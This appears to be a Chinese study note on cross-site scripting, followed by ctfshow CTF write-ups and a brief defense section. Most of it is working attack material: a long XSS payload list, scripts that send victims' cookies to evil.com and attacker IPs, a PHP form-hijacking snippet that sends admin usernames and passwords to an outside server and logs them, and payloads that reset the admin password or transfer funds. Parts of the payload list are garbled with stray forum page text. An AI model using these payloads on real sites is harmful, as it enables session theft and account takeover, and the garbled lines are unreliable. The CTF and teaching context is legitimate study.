# 基础

## 原理

指攻击者利用网站程序对用户输入过滤不足，**输入可以显示在页面上对其他用户造成影响的HTML代码**，从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。通过在用户端注入恶意的可执行脚本，若服务器对用户的输入不进行处理或处理不严，则浏览器就会直接执行用户注入的脚本

发现技巧：**用户输入与数据回显**

-**数据交互**的地方

​	get、post、headers

​    反馈与浏览

​	富文本编辑器

​	各类标签插入和自定义

-**数据输出**的地方

​	用户资料

​	关键词、标签、说明

​	文件上传

## 危害

网络钓鱼，包括获取各类用户账号；

窃取用户cookies资料，从而获取用户隐私信息，或利用用户身份对网站执行操作；

劫持用户（浏览器）会话，从而执行任意操作，例如非法转账、发表日志、邮件等；

强制弹出广告页面、刷流量等；

网页挂马；

进行恶意操作，如任意篡改页面信息、删除文章等；

进行大量的客户端攻击，如ddos等；

获取客户端信息，如用户的浏览历史、真实ip、开放端口等；

控制受害者机器向其他网站发起攻击；

结合其他漏洞，如csrf,实施进一步危害；

提升用户权限，包括进一步渗透网站；

传播跨站脚本蠕虫等

<img src="图片\Dz2ze49-t2bzOUvW-BZ53A.png" alt="Dz2ze49-t2bzOUvW-BZ53A" style="zoom:80%;" />

<img src="图片\NytbE0mzePrttdaB1jzlgg.png" alt="NytbE0mzePrttdaB1jzlgg" style="zoom:67%;" />

## 分类及细节

### 反射型 XSS

反射型 XSS，非持久化，需要**欺骗用户自己去点击链接**才能触发 XSS 代码

反射型 xss 攻击的方法，攻击者通过发送邮件或诱导等方法，将包含有 xss 恶意链接发送给目标用户，当目标用户访问该链接时，服务器将接收该用户的请求并进行处理，然后服务器把带有xss 恶意脚本发送给目标用户的浏览器，浏览器解析这段带有 xss 代码的恶意脚本后，就会触发 xss 攻击

**挖掘**：1.寻找用户能够输入，在客户端可控的输入点。 2.输入恶意参数后，能够原型输出，输入没有过滤恶意代码

### 存储型 xss

存储型 XSS，持久化，代码是**存储在服务器中的数据库里**，如在个人信息或发表文章等地方，可以插入代码，如果插入的数据没有过滤或过滤不严，那么这些恶意代码没有经过过滤将储存到数据库中，用户访问

**挖掘**：寻找一切能输入的地方，例如留言板、发表文章、友情链接，能与数据库交互的地方，都有可能存在xss 漏洞，除了检测输入还要检测输出是否有过滤

### dom 型 xss

DOM 型 XSS 其实是一种特殊类型的反射型 XSS，它是基于 DOM 文档对象模型的一种漏洞

在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的 Document object 文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过 JS 脚本对文档对象进行编辑从而修改页面的元素。也就是说，**客户端的脚本程序可以通过DOM 来动态修改页面内容，从客户端获取 DOM 中的数据并在本地执行**。基于这个特性，就可以利用 JS 脚本来实现 XSS 漏洞的利用

以下是一些经常出现 dom xss 的关键语句

```
document.referer 属性
window.name 属性
location 属性
innerHTML 属性
documen.write 属性
```

DOM 型 xss 程序中，只有 html 代码，dom 通过操作 HTML 或者 css 实现 HTML 属性、方法、事件，因此程序中**没有与服务器进行交互**

**挖掘**：

```
dom 型 xss 是用过改变 html 的属性或动作造成的 xss 型漏洞。
查找能操作 html 属性的函数，特别是 document.getElementById、document.getElementsByName、document.getElementsByTagName
getElementById() 返回对拥有指定 id 的第一个对象的引用。
getElementsByName() 返回带有指定名称的对象集合。
getElementsByTagName() 返回带有指定标签名的对象集合。
getelementbyid.innerHTML 更改 html 的字符串
和 js 输出的函数
document.write();
```



### xss 测试语句

在网站是否存在 xss 漏洞时，应该输入一些标签如 <、> 输入后查看网页源代码是否过滤标签，如果没过滤，很大可能存在 xss 漏洞

常用的测试语句

```
<h5>1</h5>
<span>1</span>
<script>console.log(1);</script>
闭合
"><span>x</span><"
'>"><span>x</span><'
单行注释
"><span>x</span>//
```

注意闭合标签，类似于 sql 注入闭合 sql 语句

### xss 攻击语句

```
常用的语句
<script>alert(1)</script>
<svg onload=alert(1)>
<a href=javascript:alert(1)>
<a href='javascript:alert(1)'>aa</a>
```

```
(1)普通的 XSS JavaScript 注入

<SCRIPT SRC=http://3w.org/XSS/xss.js></SCRIPT>

(2) IMG 标签 XSS 使用 JavaScript 命令

<IMG SRC=http://3w.org/XSS/xss.js/>

(3) IMG 标签无分号无引号

<IMG SRC=javascript:alert('XSS')>

(4) IMG 标签大小写不敏感

<IMG SRC=JaVaScRiPt:alert('XSS')>

(5) HTML 编码(必须有分号)

<IMG SRC=javascript:alert("XSS")>

(6)修正缺陷 IMG 标签

<IMG """><SCRIPT>alert("XSS")</SCRIPT>">

(7)formCharCode 标签(计算器)

<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>

(8)UTF-8 的 Unicode 编码(计算器)

<IMG SRC=jav..省略..S')>

(9)7 位的 UTF-8 的 Unicode 编码是没有分号的(计算器)

<IMG SRC=jav..省略..S')>
```



```
(10)十六进制编码也是没有分号(计算器)
<IMG SRC=&#x6A&#x61&#x76&#x61..省略..&#x58&#x53&#x53&#x27&#x29>

(11)嵌入式标签,将 Javascript 分开
<IMG SRC="jav ascript:alert('XSS');">

(12)嵌入式编码标签,将 Javascript 分开
<IMG SRC="jav ascript:alert('XSS');">

(13)嵌入式换行符
<IMG SRC="jav ascript:alert('XSS');">

(14)嵌入式回车
<IMG SRC="jav ascript:alert('XSS');">

(15)嵌入式多行注入 JavaScript,这是 XSS 极端的例子
<IMG SRC="javascript:alert('XSS')">

(16)解决限制字符(要求同页面)
<script>z='document.'</script><script>z=z+'write("'</script><script>z=z+'<script'</script><s
cript>z=z+'
src=ht'</script><script>z=z+'tp://ww'</script><script>z=z+'w.shell'</script><script>z=z+'.ne
t/1.'</script><script>z=z+'js></sc'</script><script>z=z+'ript>")'</script><script>eval_r(z)</script>

(17)空字符 12-7-1 T00LS - Powered by Discuz! Board
https://www.a.com/viewthread.php?action=printable&tid=15267 2/6perl -e 'print "<IMG
SRC=java\0script:alert(\"XSS\")>";' > out

(18)空字符 2,空字符在国内基本没效果.因为没有地方可以利用
perl -e 'print "<SCR\0IPT>alert(\"XSS\")</SCR\0IPT>";' > out

(19)Spaces 和 meta 前的 IMG 标签
<IMG SRC=" javascript:alert('XSS');">

(20)Non-alpha-non-digit XSS
<SCRIPT/XSS SRC="http://3w.org/XSS/xss.js"></SCRIPT>

(21)Non-alpha-non-digit XSS to 2
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>

(22)Non-alpha-non-digit XSS to 3
<SCRIPT/SRC="http://3w.org/XSS/xss.js"></SCRIPT>

(23)双开括号
<<SCRIPT>alert("XSS");//<</SCRIPT>

(24)无结束脚本标记(仅火狐等浏览器)
<SCRIPT SRChttp://3w.org/XSS/xss.js?<B>

(25)无结束脚本标记 2
<SCRIPT SRC=//3w.org/XSS/xss.js>

(26)半开的 HTML/JavaScript XSS
<IMG SRC="javascript:alert('XSS')"

(27)双开角括号
<iframe src=http://3w.org/XSS.html <

(28)无单引号 双引号 分号
<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>

(29)换码过滤的 JavaScript
\";alert('XSS');//

(30)结束 Title 标签
</TITLE><SCRIPT>alert("XSS");</SCRIPT>

(31)Input Image
<INPUT SRC="javascript:alert('XSS');">

(32)BODY Image
<BODY BACKGROUND="javascript:alert('XSS')">

(33)BODY 标签
<BODY('XSS')>

(34)IMG Dynsrc
<IMG DYNSRC="javascript:alert('XSS')">

(35)IMG Lowsrc
<IMG LOWSRC="javascript:alert('XSS')">

(36)BGSOUND
<BGSOUND SRC="javascript:alert('XSS');">

(37)STYLE sheet
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">

(38)远程样式表
<LINK REL="stylesheet" HREF="http://3w.org/xss.css">

(39)List-style-image(列表式)
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS

(40)IMG VBscript
<IMG SRC='vbscript:msgbox("XSS")'></STYLE><UL><LI>XSS

(41)META 链接 url
<META HTTP-EQUIV="refresh" CONTENT="0;URL=http://;URL=javascript:alert('XSS');">

(42)Iframe
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>

(43)Frame
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>12-7-1 T00LS - Powered by Discuz!
Boardhttps://www.a.com/viewthread.php?action=printable&tid=15267 3/6

(44)Table
<TABLE BACKGROUND="javascript:alert('XSS')">

(45)TD
<TABLE><TD BACKGROUND="javascript:alert('XSS')">

(46)DIV background-image
<DIV STYLE="background-image: url(javascript:alert('XSS'))">

(47)DIV background-image 后加上额外字符(1-32&34&39&160&8192-8&13&12288&65279)
<DIV STYLE="background-image: url(javascript:alert('XSS'))">

(48)DIV expression
<DIV STYLE="width: expression_r(alert('XSS'));">

(49)STYLE 属性分拆表达
<IMG STYLE="xss:expression_r(alert('XSS'))">

(50)匿名 STYLE(组成:开角号和一个字母开头)
<XSS STYLE="xss:expression_r(alert('XSS'))">

(51)STYLE background-image
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><ACLASS=XSS></A>

(52)IMG STYLE 方式
exppression(alert("XSS"))'>

(53)STYLE background
<STYLE><STYLEtype="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>

(54)BASE
<BASE HREF="javascript:alert('XSS');//">

(55)EMBED 标签,你可以嵌入 FLASH,其中包涵 XSS
<EMBED SRC="http://3w.org/XSS/xss.swf" ></EMBED>

(56)在 flash 中使用 ActionScrpt 可以混进你 XSS 的代码
a="get";b="URL(\"";c="javascript:";d="alert('XSS');\")";eval_r(a+b+c+d);

(57)XML namespace.HTC 文件必须和你的 XSS 载体在一台服务器上
<HTML xmlns:xss><?import namespace="xss"
implementation="http://3w.org/XSS/xss.htc"><xss:xss>XSS</xss:xss></HTML>

(58)如果过滤了你的 JS 你可以在图片里添加 JS 代码来利用
<SCRIPT SRC=""></SCRIPT>

(59)IMG 嵌入式命令,可执行任意命令
<IMG SRC="http://www.a.com/a.php?a=b">

(60)IMG 嵌入式命令(a.jpg 在同服务器)
Redirect 302 /a.jpg http://www.XXX.com/admin.asp&deleteuser

(61)绕符号过滤
<SCRIPT a=">" SRC="http://3w.org/xss.js"></SCRIPT>

(62)<SCRIPT =">" SRC="http://3w.org/xss.js"></SCRIPT>

(63)<SCRIPT a=">" " SRC="http://3w.org/xss.js"></SCRIPT>

(64)<SCRIPT "a='>'" SRC="http://3w.org/xss.js"></SCRIPT>

(65)<SCRIPT a=`>` SRC="http://3w.org/xss.js"></SCRIPT>

(66)12-7-1 T00LS - Powered by Discuz! Board
https://www.a.com/viewthread.php?action=printable&tid=15267 4/6<SCRIPT a=">'>"
SRC="http://3w.org/xss.js"></SCRIPT>

(67)<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://3w.org/xss.js"></SCRIPT>

(68)URL 绕行
<A HREF="http://127.0.0.1/">XSS</A>

(69)URL 编码
<A HREF="http://3w.org">XSS</A>

(70)IP 十进制
<A HREF="http://3232235521″>XSS</A>

(71)IP 十六进制
<A HREF="http://0xc0.0xa8.0×00.0×01″>XSS</A>

(72)IP 八进制
<A HREF="http://0300.0250.0000.0001″>XSS</A>

(73)混合编码
<A HREF="http://6 6.000146.0×7.147/"">XSS</A>

(74)节省[http:]
<A HREF="//www.google.com/">XSS</A>

(75)节省[www]
<A HREF="http://google.com/">XSS</A>

(76)绝对点绝对 DNS
<A HREF="http://www.google.com./">XSS</A>

(77)javascript 链接
<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
```

### xss 常见利用

xss 漏洞能够通过构造恶意的 xss 语句实现很多功能，其中最常用的时，**构造 xss 恶意代码获取对方浏览器的 cookie**

保存为 js

```
var img=document.createElement("img");
img.src="http://www.evil.com/log?"+escape(document.cookie);
document.body.appendChild(img);
```

再插入恶意 payload

```
<script src="http://192.168.0.127/xss.js"></script>
```

还可以直接插入恶意payload

```
javascript:eval(document.location="http://192.168.0.170/?cookie="+document.cookie);
```

当发现存在 xss 漏洞时，如果只是弹出信息窗口，这样只能证明存在一个 xss 漏洞，想再进一步深入的话，就必须学会加载 xss 攻击 payload。同时加载 payload 也要考虑到语句的长度，**语句是越短越好**，因为有的插入语句的长度会被限制

常见的加载攻击语句有

```
<script src="http://192.168.0.121/xss.js"></script> 
//单引号可以去掉
<script src=http://192.168.0.121/xss.js></script>
//可以变成
<scriptsrc=//192.168.0.121/xss.js></script>  //这种格式如果网站是 http 会自动加载 http，如果网站是https
会自动变成 https
```

在 kali 里面打开 sudo python -m SimpleHTTPServer 80 小型 web 服务，登陆 dvwa 后台输入 xss 代码，插入之后，受害者访问该网页就会把它的 cookie 发送到kali 的web 服务上。查看日志就能得到 cookie

**常见的标准 payload**

```
注意 网站采用的协议。
<script src="http://192.168.0.121/xss.js"></script>
<script src="https://192.168.0.121/xss.js"></script>
自动选择协议
<script src=//192.168.0.121/xss.js></script>
```

**图片创建加载连接**

```
<img src=''
onerror=document.body.appendChild(document.createElement('script')).src='//192.168.0.110/xss.
js'>
```

**字符并接**

```
这种一般是输入的字符有限制的时候使用
<script>z='document.'</script>
<script>z=z+'write("'</script>
<script>z=z+'<script'</script>
<script>z=z+' src=ht'</script>
<script>z=z+'tp://www.'</script>
<script>z=z+'xsstools'</script>
<script>z=z+'.com/a'</script>
<script>z=z+'mER></sc'</script>
<script>z=z+'ript>")'</script>
<script>eval(z)</script>
有的情况要用/**/注释不需要的代码
```

**jquery 加载**

```
<script>$.getScript("//www.xsstools.com/amER");</script>
```

### XSS平台利用

蓝莲花战队的，已及 下载源码 https://github.com/78778443/xssplatform 解压当前目录 填写信息即可安装 等等

### XSS 绕过

绕过：https://xz.aliyun.com/t/4067

#### gpc 过滤字符

如果 gpc 开启的时候，**特殊字符会被加上斜杠**即，`'`变成`\'` xss 攻击代码不要带用单引号或双引号。绕过 gpc 在 php 高 版本 gpc 默认是没有的，但是开发程序员会使用 addcslashes()对特殊字符进行转义

```
<script src='http://www.xss123.com/JGdbsl?1623638390'></script>  这个是执行不了的
<script src=http://www.xss123.com/JGdbsl?1623638390></script>    没有单引号可执行
```

#### 过滤 alert

当页面过滤 alert 这个函数时，因为这个函数会弹窗，不仅很多程序会对他进行过滤，而且很多waf 都会对其进行拦截。所以不存在 alert 即可

```
<script>prompt(/xss/);</script>
<script>confirm(1);</script>
<script src=http://www.xss123.com/eciAKj?1623635663></script>
```

#### 过滤标签

在程序里如果使用 html 实体过滤 在 php 会使用 htmlspecialchars() 对输入的字符进行实体化实体化之后的字符不会在 html 执行。

把预定义的字符 "<" （小于）和 ">" （大于）转换为 HTML 实体，构造xss 恶意代码大多数都必须使用<或者>，这两个字符被实体化后在 html 里就不能执行了。预定义的字符是

```
& (和号)成为 &amp
" (双引号)成为 &quot
’ (单引号)成为&#039
< (小于)成为 &lt
>(大于)成为 &gt
```

<img src="图片\Snipaste_2023-02-02_13-57-56.png" alt="Snipaste_2023-02-02_13-57-56" style="zoom:80%;" />

但是有在 input 这些标签里是不用考虑标签实体化，因为用不上<>这两个标签

```
<input type="text" name="username" value="" onclick="javascript:alert('xss');"/>
```

<img src="图片\Snipaste_2023-02-02_13-58-38.png" alt="Snipaste_2023-02-02_13-58-38" style="zoom:80%;" />

#### ascii 编码

```
<script>alert(String.fromCharCode(88,83,83))</script>
```

#### url 编码

```
<a href="javascript:%61%6c%65%72%74%28%32%29">123</a>
```

#### JS 编码

https://www.jb51.net/tools/zhuanhuan.htm

#### 八进制编码

```
<script>eval("\141\154\145\162\164\50\61\51");</script>
```

#### 16 进制编码

```
<script>eval("\x61\x6c\x65\x72\x74\x28\x31\x29")</script>
```

#### jsunicode 编码

```
<script>\u0061\u006c\u0065\u0072\u0074('xss');</script>
```

#### HTML 编码

在=后可以解析 html 编码

**十进制**

```
<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;" />
<button onclick="confirm('7&#39;);">Button</button>
```

**十六进制**

```
<img src="x" onerror="&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;" />
```

**base64 编码**

使用伪协议 base64 解码执行 xss

```
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">111</a>
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
```

### 表单劫持

后台植入Cookie&表单劫持

条件：**已取得相关web权限后**

1、写入代码到登录成功文件，利用 beef 或 xss 平台实时监控 Cookie 等凭据实现权限维持

2、若存在同源策略或防护情况下，Cookie获取失败可采用**表单劫持或数据明文传输实现**

```
1、插入获取帐号密码文件中-login_check.php
$up='<script src=http://47.94.236.117/get.php?user='.$metinfo_admin_name."&pass=".$metinfo_admin_pass.'></script>';
echo $up;


2、服务器上创建接受代码文件并写入保存
<?php
$u=$_GET['user'];
$p=$_GET['pass'];
$myfile = fopen("newfile.txt", "a+");
fwrite($myfile, $u);
fwrite($myfile, '|');
fwrite($myfile, $p);
fwrite($myfile, '\n');
fclose($myfile);
?>
```

# ctfshow

## web316

<img src="图片\Snipaste_2023-02-02_17-00-05.png" alt="Snipaste_2023-02-02_17-00-05" style="zoom:80%;" />

**反射型**，输入有回显，输入测试语句 `<script>alert(1)</script> `有弹窗，我们直接写入获取 cookie 的语句，然后发送到我们自己的服务器，靶场的机器人管理员会去点击页面访问我们的 payload

```
<img src=1 onerror=window.location.href='http://43.142.255.132/'+document.cookie;>
```

显示我们是admin，而且 cookie在变化

<img src="图片\Snipaste_2023-02-02_17-06-15.png" alt="Snipaste_2023-02-02_17-06-15" style="zoom:80%;" />

使用如下 payload

```
<script>document.location.href='http://43.142.255.132/'+document.cookie</script>
<body onload="window.open('http://43.142.255.132/'+document.cookie)"></body>
<svg onload="window.open('http://43.142.255.132/'+document.cookie)"></svg>
<input onfocus="window.open('http://43.142.255.132/'+document.cookie)" autofocus></input>
<iframe onload="window.open('http://43.142.255.132/'+document.cookie)"></iframe>
```

获得 cookie

```
ctfshow%7Bef007b84-226c-486c-9df5-d75c938eedd0%7D
```

## web317

script被过滤了

使用 `<body onload=alert(1)></body>` 显示弹窗

```
<body onload="window.open('http://43.142.255.132/'+document.cookie)"></body>
```

收到 flag

<img src="图片\Snipaste_2023-02-02_17-21-09.png" alt="Snipaste_2023-02-02_17-21-09" style="zoom:80%;" />



## web318

测试过滤了img

```
<body onload="window.open('http://43.142.255.132/'+document.cookie)"></body>
```

```
<input onload="window.location.href='http://43.142.255.132/'+document.cookie;">
<svg onload="window.location.href='http://43.142.255.132/'+document.cookie;">
```

## web319

空格被ban，用`/**/`来替代

```
<iframe/**/onload="window.open('http://43.142.255.132/'+document.cookie)"></iframe>
```

```
<svg/**/onload="window.location.href='http://43.142.255.132/'+document.cookie;">
```

## web320

过滤空格 用 / 代替

```
<svg/onload="window.location.href='http://43.142.255.132/'+document.cookie;">
```

## web321~326

```
<body/**/onload="window.open('http://43.142.255.132/'+document.cookie)"></body>
```

## web327

存储型 XSS

一眼望去是一个发信的页面，这个和 XSS 有何关系呢？发信了之后，收信人可能会看嘛，也是符合**输入并回显**的

<img src="图片\Snipaste_2023-02-02_17-58-13.png" alt="Snipaste_2023-02-02_17-58-13" style="zoom:80%;" />

```
<script>window.location.href='http://43.142.255.132/'+document.cookie</script>
```

```
<body/**/onload="window.open('http://43.142.255.132/'+document.cookie)"></body>
```

## web328

简单的 crud ，有 注册、登录、用户管理、登出的功能，怎样才和 XSS 有关呢？

<img src="图片\Snipaste_2023-02-02_21-07-50.png" alt="Snipaste_2023-02-02_21-07-50" style="zoom:80%;" />

有个想法，假如我们注册**恶意的用户名密码**，在管理员看到后便触发了 XSS，可盗取 COOKIE

<img src="图片\Snipaste_2023-02-02_21-09-41.png" alt="Snipaste_2023-02-02_21-09-41" style="zoom:67%;" />

```
// 注册的恶意用户名
<script>window.location.href='http://43.142.255.132/'+document.cookie</script>
<iframe onload="window.open('http://43.142.255.132/'+document.cookie)"></iframe>
```

然鹅发现一得到 COOKIE 便失效了

## web329

-存储型-失效凭据需1步完成所需操作，所以换一个思路获取页面元素

```
<script>
$('.laytable-cell-1-0-1').each(function(index,value){
    if(value.innerHTML.indexOf('ctf'+'show')>-1){
        window.location.href='http://43.142.255.132/'+value.innerHTML; 
    }
});
</script>
```

## web330

借助修改密码重置管理员密码(GET)

注册用户名为

```
<script>window.location.href='http://127.0.0.1/api/change.php?p=123';</script>
```

```
http://127.0.0.1/api/change.php?p=123 //为修改密码的链接，admin触发这个时便修改了自己的密码
```

再用 admin:123 登录即可看到密码

<img src="图片\Snipaste_2023-02-02_21-42-43.png" alt="Snipaste_2023-02-02_21-42-43" style="zoom:80%;" />

## web331

存储型-借助修改密码重置管理员密码(POST)

```
<script>$.ajax({url:'http://127.0.0.1/api/change.php',type:'post',data:{p:'123'}});</script>
```

思路与楼上一样，提交方式改为 POST

## web322-323

一个是get请求，一个是post请求，payload类似web331，主要是向admin那里转账到自己注册的新号，然后去买flag就行了，当然你们可以发现题目其实有个小漏洞，自己向自己转钱钱也还会越来越多

好吧考虑到大家水平我把这道题发个payload,两道题分别是get和post，我们知道jquery的这个ajax不能携带cookie请求，所以有点麻烦，但是如果是本地请求就刚好绕过了这一点，我们先创建一个号

```
<script src=我自己的js利用脚本内容是下面这个></script>
```

（记得映射公网），之后登陆退出后，再创建一个名为y4tacker坐等收钱

```
$.ajax({
                url: "http://127.0.0.1/api/amount.php",
                method: "POST",
                data:{
                    'u':'y4tacker',
                    'a':10000
                },
                cache: false,
                success: function(res){                  

            }});
```

复制粘贴Y4tacker的文章 [[CTFSHOW]XSS入门(佛系记录)](https://blog.csdn.net/solitudi/article/details/111568030?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167538790616782425695490%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=167538790616782425695490&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-4-111568030-null-null.blog_rank_default&utm_term=xss&spm=1018.2226.3001.4450)

# 防御

**1**、过滤一些危险字符，以及转义& < > " ' 等危险字符

自定义过滤函数引用

**2**、HTTP-only Cookie

https://www.php.cn/php-ask-457831.html

php.ini设置或代码引用

session.cookie_httponly =1

ini_set("session.cookie_httponly", 1);

**3**、设置CSP(Content Security Policy)

https://blog.csdn.net/a1766855068/article/details/89370320

header("Content-Security-Policy:img-src 'self' ");

**4**、输入内容长度限制，实体转义等


